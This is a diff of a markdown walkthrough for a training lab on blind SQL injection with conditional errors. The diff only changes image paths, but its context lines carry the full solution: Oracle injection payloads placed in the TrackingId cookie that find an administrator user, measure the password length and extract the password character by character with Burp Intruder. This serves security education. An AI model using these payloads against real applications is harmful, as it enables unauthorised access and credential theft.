@@ -13,9 +13,9 @@ To solve the lab, log in as the `administrator` user.
 
 1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
 
-![2025-05-21_05-33.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-33.png)
+![2025-05-21_05-33.png](Lab_img/2025-05-21_05-33.png)
 
-![2025-05-21_05-34.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-34.png)
+![2025-05-21_05-34.png](Lab_img/2025-05-21_05-34.png)
 
 2. Modify the `TrackingId` cookie, appending a single quotation mark to it: `TrackingId=xyz'`Verify that an error message is received.
                         
@@ -29,7 +29,7 @@ TrackingId=xyz'||(SELECT '')||'
 
 ```
 
-![2025-05-21_05-35.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-35.png)
+![2025-05-21_05-35.png](Lab_img/2025-05-21_05-35.png)
 
 In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
 
@@ -38,7 +38,7 @@ TrackingId=xyz'||(SELECT '' FROM dual)||'
 
 ```
 
-![2025-05-21_05-38.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-38.png)
+![2025-05-21_05-38.png](Lab_img/2025-05-21_05-38.png)
 
 As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
                         
@@ -48,7 +48,7 @@ As you no longer receive an error, this indicates that the target is probably us
 TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
 ```
 
-![2025-05-21_05-36.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-36.png)
+![2025-05-21_05-36.png](Lab_img/2025-05-21_05-36.png)
 
 This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
 
@@ -60,7 +60,7 @@ TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 
 ```
 
-![2025-05-21_05-37.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-37.png)
+![2025-05-21_05-37.png](Lab_img/2025-05-21_05-37.png)
 
 As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
                         
@@ -71,7 +71,7 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 
 ```
 
-![2025-05-21_05-38.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-38%201.png)
+![2025-05-21_05-38.png](Lab_img/2025-05-21_05-38%201.png)
 
 Verify that an error message is received.
                         
@@ -82,7 +82,7 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 
 ```
 
-![2025-05-21_05-38_1.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-38_1.png)
+![2025-05-21_05-38_1.png](Lab_img/2025-05-21_05-38_1.png)
 
 Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition
  and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.
@@ -94,7 +94,7 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM user
 
 ```
 
-![2025-05-21_05-39.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-39.png)
+![2025-05-21_05-39.png](Lab_img/2025-05-21_05-39.png)
 
 Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.
                         
@@ -106,7 +106,7 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' 
 
 ```
 
-![2025-05-21_05-41.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-41.png)
+![2025-05-21_05-41.png](Lab_img/2025-05-21_05-41.png)
 
 This condition should be true, confirming that the password is greater than 1 character in length.
                         
@@ -123,11 +123,11 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' 
 
 ```
 
-![2025-05-21_05-42.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-42.png)
+![2025-05-21_05-42.png](Lab_img/2025-05-21_05-42.png)
 
-![2025-05-21_05-43.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-43.png)
+![2025-05-21_05-43.png](Lab_img/2025-05-21_05-43.png)
 
-![2025-05-21_05-44.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-44.png)
+![2025-05-21_05-44.png](Lab_img/2025-05-21_05-44.png)
 
 And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
                         
@@ -141,7 +141,7 @@ use Burp Intruder. Send the request you are working on to Burp Intruder,
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
-![2025-05-21_05-46.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-46.png)
+![2025-05-21_05-46.png](Lab_img/2025-05-21_05-46.png)
 
 This uses the `SUBSTR()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
                         
@@ -152,20 +152,20 @@ following as the cookie value (note the payload position markers):
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
-![2025-05-21_05-47.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-47.png)
+![2025-05-21_05-47.png](Lab_img/2025-05-21_05-47.png)
 
 15. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
 
-![2025-05-21_05-48.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-48.png)
+![2025-05-21_05-48.png](Lab_img/2025-05-21_05-48.png)
 
      
 16. Launch the attack by clicking the " Start attack" button.
 
 17. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
 
-![2025-05-21_05-48_1.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-48_1.png)
+![2025-05-21_05-48_1.png](Lab_img/2025-05-21_05-48_1.png)
 
-![2025-05-21_05-49.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-49.png)
+![2025-05-21_05-49.png](Lab_img/2025-05-21_05-49.png)
 
                
 18. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
@@ -178,15 +178,15 @@ TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0
 you can use a cluser mod in the burp intruder.
 19. Launch the modified attack, review the results, and note the character at the second offset.
 
-![2025-05-21_05-50.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-50.png)
+![2025-05-21_05-50.png](Lab_img/2025-05-21_05-50.png)
 
-![2025-05-21_05-51.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-51.png)
+![2025-05-21_05-51.png](Lab_img/2025-05-21_05-51.png)
 
-![2025-05-21_05-51_1.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-51_1.png)
+![2025-05-21_05-51_1.png](Lab_img/2025-05-21_05-51_1.png)
 
-![2025-05-21_05-53.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-53.png)
+![2025-05-21_05-53.png](Lab_img/2025-05-21_05-53.png)
 
-![2025-05-21_05-54.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-54.png)
+![2025-05-21_05-54.png](Lab_img/2025-05-21_05-54.png)
 
                
 20. Continue this process testing offset 3, 4, and so on, until you have the whole password.
@@ -194,7 +194,7 @@ you can use a cluser mod in the burp intruder.
                
 21. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.
 
-![2025-05-21_05-55.png](Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%201efc172892ad8077848ed90d73a54e9f/2025-05-21_05-55.png)
+![2025-05-21_05-55.png](Lab_img/2025-05-21_05-55.png)
 
 ### **Community solutions**
 
